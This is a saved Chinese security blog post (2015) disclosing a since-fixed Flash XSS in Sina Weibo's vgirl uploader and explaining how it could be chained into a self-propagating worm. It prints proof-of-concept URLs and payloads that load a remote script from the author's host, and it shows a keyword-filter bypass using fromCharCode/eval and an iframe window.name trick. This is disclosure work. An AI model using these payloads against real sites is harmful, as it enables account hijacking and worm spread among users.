@@ -1,0 +1,344 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./从新浪微博一处Flash XSS到XSS Worm  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./从新浪微博一处Flash XSS到XSS Worm  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./从新浪微博一处Flash XSS到XSS Worm  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>从新浪微博一处Flash XSS到XSS Worm | 离别歌</title>
+<link href="./从新浪微博一处Flash XSS到XSS Worm  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./从新浪微博一处Flash XSS到XSS Worm  离别歌/styles.css" rel="stylesheet"/>
+<link href="./从新浪微博一处Flash XSS到XSS Worm  离别歌/style.css" rel="stylesheet"/>
+<link href="./从新浪微博一处Flash XSS到XSS Worm  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./从新浪微博一处Flash XSS到XSS Worm  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/jquery.min.js"></script>
+<link href="./从新浪微博一处Flash XSS到XSS Worm  离别歌/code.css" rel="stylesheet"/>
+<link href="./从新浪微博一处Flash XSS到XSS Worm  离别歌/button.css" rel="stylesheet"/>
+<link href="./从新浪微博一处Flash XSS到XSS Worm  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./从新浪微博一处Flash XSS到XSS Worm  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/HTML/sina-weibo-flashxss-worm.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/HTML/sina-weibo-flashxss-worm.html&amp;text=%E4%BB%8E%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9A%E4%B8%80%E5%A4%84Flash%20XSS%E5%88%B0XSS%20Worm"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/HTML/sina-weibo-flashxss-worm.html&amp;title=%E4%BB%8E%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9A%E4%B8%80%E5%A4%84Flash%20XSS%E5%88%B0XSS%20Worm"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/HTML/sina-weibo-flashxss-worm.html&amp;is_video=false&amp;description=%E4%BB%8E%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9A%E4%B8%80%E5%A4%84Flash%20XSS%E5%88%B0XSS%20Worm"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E4%BB%8E%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9A%E4%B8%80%E5%A4%84Flash%20XSS%E5%88%B0XSS%20Worm&amp;body=Check out this article: https%3A//www.leavesongs.com/HTML/sina-weibo-flashxss-worm.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/HTML/sina-weibo-flashxss-worm.html&amp;title=%E4%BB%8E%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9A%E4%B8%80%E5%A4%84Flash%20XSS%E5%88%B0XSS%20Worm"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/HTML/sina-weibo-flashxss-worm.html&amp;title=%E4%BB%8E%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9A%E4%B8%80%E5%A4%84Flash%20XSS%E5%88%B0XSS%20Worm"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/HTML/sina-weibo-flashxss-worm.html&amp;title=%E4%BB%8E%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9A%E4%B8%80%E5%A4%84Flash%20XSS%E5%88%B0XSS%20Worm"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/HTML/sina-weibo-flashxss-worm.html&amp;title=%E4%BB%8E%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9A%E4%B8%80%E5%A4%84Flash%20XSS%E5%88%B0XSS%20Worm"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/HTML/sina-weibo-flashxss-worm.html&amp;name=%E4%BB%8E%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9A%E4%B8%80%E5%A4%84Flash%20XSS%E5%88%B0XSS%20Worm&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">从新浪微博一处Flash XSS到XSS Worm</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2015年1月8日 00:23" itemprop="datePublished">
+                    2015 一月 08 00:23
+                </time>
+</div>
+<div class="article-tag">
+            阅读：12151
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/HTML">web前端</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/xss%E8%A0%95%E8%99%AB">xss蠕虫</a>,
+                
+                <a class="tag-link" href="/tag/flashxss">flashxss</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>这是我之前提交到新浪应急响应中心的漏洞，因为我看到新浪已经修复了，所以发出来。</p>
+<p>最近一直在研究一些flash，希望能发现点什么。</p>
+<p>偶然发现这样一个swf：<a href="http://vgirl.weibo.com/swf/BlogUp.swf"><a href="http://vgirl.weibo.com/swf/BlogUp.swf">http://vgirl.weibo.com/swf/BlogUp.swf</a></a> （已修复），一般上传swf、播放器这种地方容易出现xss，这个BlogUp.swf就是上传的flash。</p>
+<p>反编译看看，其中有个函数：</p>
+<div class="codehilite"><pre><span></span><span class="kd">private</span> <span class="kd">function</span> <span class="nx">init</span><span class="p">(</span><span class="nb">Number</span><span class="o">:</span><span class="nx">flash</span><span class="p">.</span><span class="nx">events</span><span class="o">::</span><span class="nb">Event</span> <span class="o">=</span> <span class="kc">null</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// debugfile: F:\flash\blogUp_Vgirl\src;;xblogUploadImage.as</span>
+    <span class="nx">stage</span><span class="p">.</span><span class="nx">scaleMode</span> <span class="o">=</span> <span class="nb">StageScaleMode</span><span class="p">.</span><span class="nx">NO_SCALE</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">bIsUploading</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">tList</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
+    <span class="nx">removeEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">ADDED_TO_STAGE</span><span class="o">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">init</span><span class="p">);</span>
+    <span class="k">var</span> <span class="nx">loc0</span><span class="o">:*</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Sprite</span><span class="p">();</span>
+    <span class="nx">lineStyle</span><span class="p">();</span>
+    <span class="nx">beginFill</span><span class="p">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="nx">drawRect</span><span class="p">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">1000</span><span class="o">,</span> <span class="mi">1000</span><span class="p">);</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">buttonMode</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="nb">MouseEvent</span><span class="p">.</span><span class="nx">CLICK</span><span class="o">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">onClicked</span><span class="p">);</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">addChild</span><span class="p">(</span><span class="nx">loc0</span><span class="p">);</span>
+    <span class="k">var</span> <span class="nx">loc2</span><span class="o">:*</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="kc">undefined</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">jsonselectfiles</span> <span class="o">=</span> <span class="nx">stage</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="p">[</span><span class="s2">"onselectfiles"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">""</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">jsonsinglecomplete</span> <span class="o">=</span> <span class="nx">stage</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="p">[</span><span class="s2">"onsinglecomplete"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">""</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">jsonallcomplete</span> <span class="o">=</span> <span class="nx">stage</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="p">[</span><span class="s2">"onallcomplete"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">""</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">jsonerror</span> <span class="o">=</span> <span class="nx">stage</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="p">[</span><span class="s2">"onerror"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">""</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">onUploadStart</span> <span class="o">=</span> <span class="nx">stage</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="p">[</span><span class="s2">"onUploadStart"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">""</span><span class="o">;</span>
+    <span class="k">var</span> <span class="nx">loc1</span><span class="o">:*</span> <span class="o">=</span> <span class="nx">stage</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="p">[</span><span class="s2">"onflashready"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">""</span><span class="o">;</span>
+    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">addCallback</span><span class="p">(</span><span class="s2">"setup"</span><span class="o">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">setup</span><span class="p">);</span>
+    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">addCallback</span><span class="p">(</span><span class="s2">"cancel"</span><span class="o">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">closeUploader</span><span class="p">);</span>
+    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">addCallback</span><span class="p">(</span><span class="s2">"setMaxSize"</span><span class="o">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">setMaxSize</span><span class="p">);</span>
+    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">loc1</span><span class="p">);</span>
+    <span class="k">return</span><span class="o">;</span>
+
+<span class="p">}</span>
+</pre></div>
+<p><code>ExternalInterface.call(loc1);</code>这句话很明显存在一个XSS，loc1是之前获取的GET参数<code>stage.loaderInfo.parameters["onflashready"]</code>。</p>
+<p>我们试试：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201501/9b051420648012.png"><img alt="新浪vgirl flash XSS导致微博蠕虫1766.png" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/9b051420648012.png"/></a></p>
+<p>弹了。其实前面几个参数也是存在XSS的，但这个xss最明显，我就不说前几个了。</p>
+<p>如果ExternalInterface.call函数的第一个参数可控的话，我们最好把POC写成这样：<code>http://vgirl.weibo.com/swf/BlogUp.swf?onflashready=(function(){alert(1)})</code> ，因为他和后面的参数组成了一个执行的代码：</p>
+<div class="codehilite"><pre><span></span>(function(){alert(1)})(param1, param2, ...)
+</pre></div>
+<p>因为我们这里这个漏洞没参数，所以最终执行的javascript实际上是(function(){alert(1)})()，我们将alert(1)换成自己的payload就能干想干的事了。</p>
+<p>然后我想提交，来到sina src看到个公告：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201501/960f1420648015.png"><img alt="新浪vgirl flash XSS导致微博蠕虫2116.png" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/960f1420648015.png"/></a></p>
+<p>我擦嘞！XSS漏洞都降级了，原因只是因为cookie加了httponly？</p>
+<p>我掐指一算，如果就这样交的话，顶多拿2个金币啊！！</p>
+<p>挖了半天就换这点金币，不行，那么我们想想怎么让我的XSS发挥点作用吧，否则憋屈得很。来个蠕虫吧。</p>
+<p>我关注到vgirl.weibo.com这个站首页是个评分的flash，大概是给MM们评分并分享的。</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201501/4f8a1420648020.png"><img alt="新浪vgirl flash XSS导致微博蠕虫2282.png" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/4f8a1420648020.png"/></a></p>
+<p>有些妹纸还是挺不错的，我喜欢。来分析一下这个flash吧：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201501/27af1420648021.png"><img alt="新浪vgirl flash XSS导致微博蠕虫2314.png" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/27af1420648021.png"/></a></p>
+<p>这里有5个API很闪眼睛。分析了一下，实际上第一个是获得妹纸列表的，第二个是给妹纸打分的，第三个是分享到微博的，第四个是获得具体妹纸信息的，第五个是关注这个妹纸的。</p>
+<p>很明显，第三个和第五个是我想要的（为毛不是第一个和第四个？）。我可以利用这俩API和之前的XSS，来让浏览的用户发表任意微博并关注我，造成一个微博蠕虫。</p>
+<p>那么继续分析一下API怎么使用（实际上比看flash代码更简单的方式是抓包，抓包大家都会我就不演示了）：</p>
+<div class="codehilite"><pre><span></span><span class="kd">private</span> <span class="kd">function</span> <span class="nx">atShe</span><span class="p">(</span><span class="nx">arg0</span><span class="o">:*</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">var</span> <span class="nx">loc0</span><span class="o">:*</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLVariables</span><span class="p">();</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">text</span> <span class="o">=</span> <span class="nx">arg0</span><span class="p">.</span><span class="nx">content</span><span class="o">;</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">uid</span> <span class="o">=</span> <span class="nx">arg0</span><span class="p">.</span><span class="nx">oid</span><span class="o">;</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">img</span> <span class="o">=</span> <span class="nx">arg0</span><span class="p">.</span><span class="nx">picurl</span><span class="o">;</span>
+    <span class="k">var</span> <span class="nx">loc1</span><span class="o">:*</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">URLRequest</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">atApi</span><span class="p">);</span>
+    <span class="nx">loc1</span><span class="p">.</span><span class="nx">method</span> <span class="o">=</span> <span class="nb">URLRequestMethod</span><span class="p">.</span><span class="nx">POST</span><span class="o">;</span>
+    <span class="nx">loc1</span><span class="p">.</span><span class="nx">data</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLVariables</span><span class="p">();</span>
+    <span class="k">var</span> <span class="nx">loc2</span><span class="o">:*</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">URLLoader</span><span class="p">();</span>
+    <span class="nx">load</span><span class="p">(</span><span class="nx">loc1</span><span class="p">);</span>
+    <span class="k">return</span><span class="o">;</span>
+
+<span class="p">}</span>
+</pre></div>
+<p>这是发表微博的函数，实际上就是发送了一个POST数据包，text是要发表的内容，img是妹纸图片，uid是妹纸的用户ID。</p>
+<p>实际上，text可以写任意文字，img可以是任意图片（属于新浪sinaimg.cn的图片，随便找个图片上传接口传一个即可），uid可以不用填写。</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201501/0fa51420648023.png"><img alt="新浪vgirl flash XSS导致微博蠕虫3008.png" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/0fa51420648023.png"/></a></p>
+<p>如上图，这样一个数据包即可发表一个微博：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201501/0c3a1420648024.png"><img alt="新浪vgirl flash XSS导致微博蠕虫3032.png" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/0c3a1420648024.png"/></a></p>
+<p>好，有了这个接口，我们就可以来制作一个蠕虫了。</p>
+<p>首先写一个payload，我用了parsec团队的兔子君写的一个javascript辅助工具love.js（<a href="https://github.com/quininer/hisoka/blob/master/doc/LoveJS.md"><a href="https://github.com/quininer/hisoka/blob/master/doc/LoveJS.md">https://github.com/quininer/hisoka/blob/master/doc/LoveJS.md</a></a> &amp;&amp; <a href="https://quininer.github.io/tests/love.js"><a href="https://quininer.github.io/tests/love.js">https://quininer.github.io/tests/love.js</a></a>）来进行数据包的发送。</p>
+<p>然后传到自己的服务器上：</p>
+<p><a href="http://mhz.pw/game/vgirl/poc.js"><a href="http://mhz.pw/game/vgirl/poc.js">http://mhz.pw/game/vgirl/poc.js</a> </a></p>
+<p>首先要清楚这一点，新浪整体对CSRF的防御基本是靠Referer来进行的，所以不管在哪发微博，都会检查referer是否来自合法的域。所以我们这个脚本运行在其他地方是不管用的，但因为我们之前找到了一个flash xss，这个flash是处于新浪vgirl域下的，合法合理。</p>
+<p>所以，我们现在的工作就是让这个flash加载我的js文件。</p>
+<p>最早想到这样一个payload：</p>
+<div class="codehilite"><pre><span></span>http://vgirl.weibo.com/swf/BlogUp.swf?onflashready=(function(){document.body.appendChild(document.createElement("script")).src="http://mhz.pw/game/vgirl/poc.js"}) 
+</pre></div>
+<p>不过运行你会发现，referer是这个的话微博是发送不成功的，我目测是被WAF拦截了还是怎样。</p>
+<p>测试了一下，拦截的是appendChild，这个关键字。</p>
+<p>我想那简单啊，把payload换成</p>
+<div class="codehilite"><pre><span></span>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,41,46,115,114,99,61,34,104,116,116,112,58,47,47,109,104,122,46,112,119,47,103,97,109,101,47,118,103,105,114,108,47,118,103,105,114,108,46,106,115,34))
+</pre></div>
+<p>就没关键字了。结果执行发现，URL太长了，flash加载不上。</p>
+<p>再想想，如何把URL变短，还要没有关键字？当然是用window.name咯：</p>
+<div class="codehilite"><pre><span></span>&lt;iframe src="http://vgirl.weibo.com/swf/BlogUp.swf?onflashready=(function(){setTimeout(window.name,0)})" name="document.body.appendChild(document.createElement('script')).src='http://mhz.pw/game/vgirl/poc.js'" id="vg"&gt;
+</pre></div>
+<p>把EXP放在iframe的name里，然后实际的payload就是setTimeout(window.name,0)，执行了window.name等于执行了我的EXP。</p>
+<p>将代码美化一下，传到服务器上。</p>
+<p>访问即可发布类似这样的微博：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201501/29cf1420648025.png"><img alt="新浪vgirl flash XSS导致微博蠕虫4551.png" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/29cf1420648025.png"/></a></p>
+<p>如果换成吸引人的文字和图片，这样，我的粉丝看了以后，多半是会点进去看看。一旦访问这个链接，也会发表这样一个微博。</p>
+<p>这样一传十十传百。</p>
+<p>形成一个XSS蠕虫，危害很大。同样，我还可以发送一个关注我的数据包，在蠕动的同时，也能无限涨粉。</p>
+<p>碍于法律的限制，我就不做测试了。关于新浪微博蠕虫，我曾经是有测试过的：<a href="http://wooyun.org/bugs/wooyun-2010-065761"><a href="http://wooyun.org/bugs/wooyun-2010-065761">http://wooyun.org/bugs/wooyun-2010-065761</a></a>，在这里可以看到效果图，和厂商回复。</p>
+<p>测试有风险，蠕动需谨慎啊……</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-1923">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">MOMO</a>
+<time datetime="2015年1月21日 14:12" itemprop="datePublished">
+                            2015 一月 21 14:12
+                        </time>
+<a href="javascript:reply_to('1923', 'MOMO')">回复</a>
+</p>
+<p class="comment-meta">赞  不说什么了 很不错</p>
+</div>
+</div>
+<div class="row" id="comment-1922">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/7487fa0993bc919517c1d87e0116cc43.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">该昵称已屏蔽</a>
+<time datetime="2015年1月13日 11:01" itemprop="datePublished">
+                            2015 一月 13 11:01
+                        </time>
+<a href="javascript:reply_to('1922', '该昵称已屏蔽')">回复</a>
+</p>
+<p class="comment-meta">文字不错，学习学习！！</p>
+</div>
+</div>
+<div class="row" id="comment-1921">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/71eadc4dcb2ad0e0633a682c7ff80ced.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://ricter.me" target="_blank">Ricter</a>
+<time datetime="2015年1月12日 23:33" itemprop="datePublished">
+                            2015 一月 12 23:33
+                        </time>
+<a href="javascript:reply_to('1921', 'Ricter')">回复</a>
+</p>
+<p class="comment-meta">叼叼叼！！！</p>
+</div>
+</div>
+<div class="row" id="comment-1919">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/afe4847f0702c35f81cae37402906597.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">东吃</a>
+<time datetime="2015年1月10日 11:14" itemprop="datePublished">
+                            2015 一月 10 11:14
+                        </time>
+<a href="javascript:reply_to('1919', '东吃')">回复</a>
+</p>
+<p class="comment-meta">叼叼叼！！！</p>
+</div>
+</div>
+<div class="row" id="comment-1917">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/8ce153400aa9178668da0bca16638aad.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.tinydawn.com/" target="_blank">D.M</a>
+<time datetime="2015年1月9日 14:44" itemprop="datePublished">
+                            2015 一月 09 14:44
+                        </time>
+<a href="javascript:reply_to('1917', 'D.M')">回复</a>
+</p>
+<p class="comment-meta">叼叼叼！！！</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="f1f9d218d06561bf7bfdfb8c8ae085ffed64192a"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/f1f9d218d06561bf7bfdfb8c8ae085ffed64192a"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="344">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="Me8M06okVbBauKySpFxGyiXJFy686HankytiOAAzmYvzupW7dW1q7WZOOCzgPbZx"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./从新浪微博一处Flash XSS到XSS Worm  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
